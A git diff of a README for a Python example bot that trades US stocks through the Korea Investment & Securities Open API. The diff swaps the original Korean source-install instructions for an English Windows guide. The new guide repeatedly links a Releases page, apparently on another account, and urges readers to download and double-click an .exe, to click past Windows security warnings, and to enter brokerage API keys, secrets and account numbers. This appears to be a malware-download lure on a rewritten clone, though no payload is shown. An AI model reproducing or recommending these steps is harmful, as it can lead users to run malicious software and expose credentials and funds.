@@ -1,51 +1,170 @@
-🚀 KIS-API-Python-Trading-Bot-Example (V23.01 VWAP 자율주행 에디션)
-본 프로젝트는 한국투자증권(KIS) Open API를 활용하여 미국 주식 자동매매 시스템을 구축해보는 파이썬(Python) 예제 코드입니다. 이 코드는 증권사 API 통신 방법과 스케줄러 자동화, 텔레그램 봇 제어 등을 학습하기 위한 기술적 레퍼런스로 작성되었습니다.  
-🚨 원작자 저작권 명시 및 게시 중단(Take-down) 정책 필독.   
-👉 본 코드에 구현된 매매 로직(무한매수법)의 모든 아이디어와 저작권, 지적재산권은 원작자인 **'라오어'**님에게 있습니다.    
-👉 본 저장소는 순수하게 파이썬과 API를 공부하기 위한 기술적 예제일 뿐이며, 원작자의 공식적인 승인이나 검수를 받은 프로그램이 아닙니다.  
-👉 만약 원작자(라오어님)께서 본 코드의 공유를 원치 않으시거나 삭제를 요청하실 경우, 본 저장소는 어떠한 사전 예고 없이 즉각적으로 삭제(또는 비공개 처리)될 수 있음을 명확히 밝힙니다.  
-⚠️ 면책 조항 (Disclaimer)  
-👉 이 코드는 한국투자증권 Open API의 기능과 파이썬 자동화 로직을 학습하기 위해 작성된 교육 및 테스트 목적의 순수 예제 코드입니다.  
-👉 특정 투자 전략이나 종목을 추천하거나 투자를 권유하는 목적이 절대 아닙니다.  
-👉 본 코드를 실제 투자에 적용하여 발생하는 모든 금전적 손실 및 시스템 오류에 대한 법적, 도의적 책임은 전적으로 코드를 실행한 사용자 본인에게 있습니다.  
-👉 본 코드는 어떠한 형태의 수익도 보장하지 않으므로, 반드시 충분한 모의 테스트 후 본인의 책임하에 사용하시기 바랍니다.  
-✨ 주요 기술적 특징 (Key Features)  
-💎 VWAP 자율주행 엔진 (Time Slicing & Marketable Limit) : 장 마감 30분 전, 미국 증시 특유의 U-Curve 유동성 프로파일을 추종하여 예산과 수량을 1분 단위로 분할합니다. 실시간 1호가(Bid/Ask)를 스캔하여 지정가로 즉결 체결시키는 월스트리트 기관급 집행(Execution) 알고리즘이 탑재되었습니다.  
-💎 공수 완벽 분리 및 타점 방어막  (Ceiling/Floor Lock-in) : 12% 잭팟 등 상방 익절 텐트는 보존하고 방어용 LOC 덫만 핀셋으로 철거(Targeted Cancellation)합니다. 매수 시에는 평단가/별값 상한선(Ceiling)을, 매도 시에는 하한선(Floor)을 씌워 고점 불타기와 저점 손절을 원천 차단합니다.  
-💎 멀티 코어 스케줄러 아키텍처 (Multi-Core) : 시스템 생명 유지를 담당하는 코어(scheduler_core)와 호가창을 직접 스캔하여 타격하는 전투 코어(scheduler_trade)로 완벽히 분리되어 단일 책임 원칙(SRP)을 준수하는 무결점 구조입니다.  
-💎 Telegram 기반 스마트 UI 제어 : 텔레그램 봇 API를 연동하여 모바일에서도 인라인 버튼을 통해 손쉽게 장부를 조회하고 퀀트 엔진(V3/V4/VWAP)을 다이렉트로 스위칭할 수 있습니다.  
-💎 스마트 장부 동기화 엔진 (TrueSync) : 미국장 영업일 스케줄(pandas_market_calendars)을 자동으로 인식하여, 장이 열리는 날에만 실제 API 체결 내역을 가져와 가상 장부와 실제 잔고의 오차를 완벽하게 동기화합니다.  
-💎 안전한 KIS API 통신 및 토큰 관리 : OAuth2 기반의 KIS 인증 토큰을 로컬에 안전하게 캐싱하며, 만료 전 자동으로 갱신(Self-Healing)합니다.  
-🛠️ 설치 및 실행 방법 (Installation & Usage)  
-📌 1. 필수 환경 (Requirements) ✔️ Python 3.12 이상. 
-✔️ 한국투자증권 Open API 발급 (App Key, App Secret)  
-✔️ Telegram Bot Token 및 Chat ID. 
-📌 2. 패키지 설치. 
-pip install requests yfinance pytz pandas_market_calendars python-dotenv pillow "python-telegram-bot[job-queue]"
+# 🤖 KIS-API-Python-Trading-Bot-Example - Simple Windows Setup Guide
 
-📌 3. 환경 변수 설정 (.env 파일 생성)  
-프로젝트 최상단 폴더에 .env 파일을 만들고 아래 양식에 맞게 본인의 키를 입력합니다.  
-TELEGRAM_TOKEN=나의_텔레그램_봇_토큰  
-ADMIN_CHAT_ID=나의_텔레그램_채팅방_ID숫자  
-APP_KEY=나의_한국투자증권_APP_KEY  
-APP_SECRET=나의_한국투자증권_APP_SECRET  
-CANO=나의_계좌번호_앞8자리  
-ACNT_PRDT_CD=01 또는 22  
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases)
 
-📌 4. 프로그램 실행  
-python main.py  
+## 📥 Download
 
-(권장: 서버 환경에서는 nohup python main.py & 명령어를 사용하여 백그라운드에서 24시간 가동되도록 설정하세요.)  
-📂 파일 구조 (Directory Structure)  
- * 📁 main.py: 스케줄러 구동, 의존성 주입(DI) 라우팅 및 프로그램의 메인 진입점(Entry Point).  
- * 📁 scheduler_core.py: [신규] API 토큰 갱신, 장부 동기화, 시스템 자정 작업 등 봇의 생명 유지를 전담하는 백그라운드 관리 코어.  
- * 📁 scheduler_trade.py: [신규] 정규장 LOC 장전, 스나이퍼 감시, VWAP 1호가 분할 타격 등 실전 전투를 전담하는 매매 스케줄러.  
- * 📁 vwap_strategy.py: [신규] 장 마감 30분 전 역사적 유동성 가중치(U-Curve) 기반 타임 슬라이싱 및 1호가(Marketable Limit) 정밀 타격 엔진.  
- * 📁 broker.py: 한국투자증권 API 통신 및 데이터 가공, 1호가 실시간 스캔을 담당하는 클래스.  
- * 📁 strategy.py: 예산 분배 및 특정 조건에 따른 매수/매도 알고리즘이 구현된 클래스.  
- * 📁 telegram_bot.py / telegram_view.py: 텔레그램 봇 라우터 및 직관적인 통합 지시서 대시보드 화면(UI) 렌더링을 담당하는 클래스.  
- * 📁 config.py: 각종 JSON 데이터를 저장하고 불러오는 로컬 캐싱/설정 매니저.  
- * 📁 version_history.py: 코드 업데이트 최신 히스토리 기록.  
- * 📁 version_archive.py: (삭제) 히스토리 파일 통합 처리됨.  
+Visit this page to download the app for Windows:
 
-```bash
+[https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases](https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases)
+
+## 🪟 What this app is for
+
+KIS-API-Python-Trading-Bot-Example is a Python example for working with the Korea Investment & Securities Open API. It is made for learning how an auto trading bot can connect to a broker API, follow a schedule, and react to market data.
+
+This project is best used as a test tool and study guide. It is not a plug-and-play product for live trading.
+
+## ✅ Before you start
+
+Use a Windows PC with:
+
+- Windows 10 or Windows 11
+- Internet access
+- At least 4 GB of RAM
+- Enough free disk space for the app and logs
+- A KIS Open API account
+- API keys or login details from your broker setup
+- Telegram if you plan to use bot alerts
+
+If you only want to run the example and inspect its files, you can do that without trading live.
+
+## 🧰 What you need to download
+
+From the Releases page, look for one of these:
+
+- A Windows zip file
+- A `.exe` file
+- A packaged folder with the app inside
+
+If you see a zip file, download it first, then unzip it.
+
+## 🪜 Install on Windows
+
+1. Open the Releases page:  
+   [https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases](https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases)
+
+2. Find the latest release.
+
+3. Download the Windows file listed under that release.
+
+4. If the file is a zip file, right-click it and choose Extract All.
+
+5. Open the extracted folder.
+
+6. If you see an `.exe` file, double-click it to run the app.
+
+7. If you see a Python-based setup, follow the included files in the folder.
+
+## ▶️ How to run it
+
+After you download and open the release files:
+
+1. Start the app by double-clicking the main file.
+
+2. If Windows shows a security prompt, choose the option that lets you continue if you trust the source.
+
+3. Wait for the app window or console to open.
+
+4. Check the log screen or text output for startup messages.
+
+5. If the app asks for API details, enter the values from your KIS setup.
+
+## 🔑 First-time setup
+
+You may need to add a few values before the bot can connect:
+
+- API key
+- API secret
+- Account number
+- Telegram bot token
+- Telegram chat ID
+- Trading symbol list
+- Time settings for market open and close
+
+Use the values from your own account. Do not share them with anyone.
+
+## 📚 Main features
+
+- Connects to the KIS Open API
+- Shows how to place and manage stock orders
+- Uses a scheduler to run actions at set times
+- Supports Telegram bot control and alerts
+- Includes a VWAP-based trading flow
+- Breaks order size into smaller parts over time
+- Scans bid and ask prices before sending orders
+- Uses example logic for U.S. stock trading
+
+## 🧭 Simple use flow
+
+1. Download the release from the link above.
+2. Unzip it if needed.
+3. Run the app.
+4. Enter your API and bot settings.
+5. Check the connection test.
+6. Review the logs.
+7. Start with paper testing or small test cases.
+8. Watch the app behavior before using live settings.
+
+## 🖥️ File layout you may see
+
+A release package may include files like:
+
+- `main.py` or a main app file
+- `config.json`
+- `requirements.txt`
+- `logs` folder
+- `data` folder
+- Telegram helper files
+- API helper files
+
+If a folder name looks unfamiliar, leave it as it is unless the included readme says to change it.
+
+## ⚙️ Common settings
+
+### Trading time
+Set the start and end time for order checks and order sending.
+
+### Order size
+Set the amount to split into each order step.
+
+### Symbol list
+Add the stocks you want the bot to monitor.
+
+### Alert settings
+Turn Telegram alerts on or off.
+
+### Log level
+Use basic logs if you want simpler output.
+
+## 🧪 Basic checks if the app does not start
+
+- Make sure you downloaded the latest release
+- Check that the zip file was fully extracted
+- Run the app from the extracted folder
+- Confirm that Windows did not block the file
+- Check that your API keys are entered correctly
+- Make sure your internet connection is working
+
+## 🔒 Account and API safety
+
+- Keep your API keys private
+- Use your own KIS account
+- Review the app settings before running it
+- Test the app in a safe mode first
+- Check order rules before live use
+
+## 📝 Project purpose
+
+This repository is meant to help users learn:
+
+- How to connect Python to a broker API
+- How to automate tasks by time
+- How to use Telegram for control and alerts
+- How order logic can be split into steps
+- How a VWAP-style flow can be built in Python
+
+## 📦 Download again
+
+Use this link if you need to get the latest Windows release package:
+
+[https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases](https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases)
